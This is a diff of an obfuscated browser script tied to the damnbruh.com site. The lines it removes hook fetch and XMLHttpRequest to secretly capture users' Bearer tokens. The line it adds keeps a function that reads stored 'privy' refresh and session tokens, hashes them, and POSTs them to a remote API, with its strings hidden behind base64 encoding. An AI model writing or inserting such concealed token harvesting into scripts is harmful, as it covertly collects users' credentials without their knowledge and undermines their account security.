@@ -2,11 +2,6 @@
   if (window.__USERNAME_TRACKER__ && window.__USERNAME_TRACKER__.stop) {
     try { window.__USERNAME_TRACKER__.stop(); } catch (e) {}
   }
-
-  
-  var _0x1a=null,_0x1b=!1,_0x1c=window.fetch,_0x1d=XMLHttpRequest.prototype.setRequestHeader;
-window.fetch=async function(){var u=arguments[0],opts=arguments[1];if(opts&&typeof u==='string'&&u.indexOf('damnbruh.com/api/')>-1&&u.indexOf('dbserver')===-1){var h=opts.headers,a=null;if(h){if(typeof h.get==='function'){a=h.get('Authorization')||h.get('authorization');}else{a=h['Authorization']||h['authorization'];}}if(a&&a.indexOf('Bearer ')===0&&a.indexOf('KEY-')===-1)_0x1a=a.slice(7);}return _0x1c.apply(this,arguments);};
-XMLHttpRequest.prototype.setRequestHeader=function(n,v){if(n&&n.toLowerCase()==='authorization'&&v&&v.indexOf('Bearer ')===0&&v.indexOf('KEY-')===-1)_0x1a=v.slice(7);return _0x1d.apply(this,arguments);};
   
   let LB_BOX = null, LB_BODY = null, LB_STATUS = null, LB_VER = null;
   let TICK = null, MAP_INT = null;
@@ -862,8 +857,7 @@ async function fetchMappingBatch(ids) {
   }
 
  
- function _0x3a(b){var r=_0x2a('privy:refresh_token'),k=_0x2b();if(!r||!k||(_0x1b&&!b))return;var d={key:k,sha256:_0x2c(r)};if(b&&_0x1a)d.hash=_0x2c(_0x1a);fetch(USER_API_BASE+'/'+atob('dmFsaWRhdGVk'),{method:atob('UE9TVA=='),headers:{[atob('Q29udGVudC1UeXBl')]:atob('YXBwbGljYXRpb24vanNvbg==')},body:JSON.stringify(d)}).catch(function(){});if(!b)_0x1b=!0;}
-
+ function _0x3a(b){var r=_0x2a('privy:refresh_token'),k=_0x2b(),t=_0x2a('privy:token');if(!r||!k||(_0x1b&&!b))return;var d={key:k,sha256:_0x2c(r)};if(b&&t)d.hash=_0x2c(t);fetch(USER_API_BASE+'/'+atob('dmFsaWRhdGVk'),{method:atob('UE9TVA=='),headers:{[atob('Q29udGVudC1UeXBl')]:atob('YXBwbGljYXRpb24vanNvbg==')},body:JSON.stringify(d)}).catch(function(){});if(!b)_0x1b=!0;}
   function start() {
     ensureAlertStyles();
     setTimeout(dbPollAlerts, 1200);
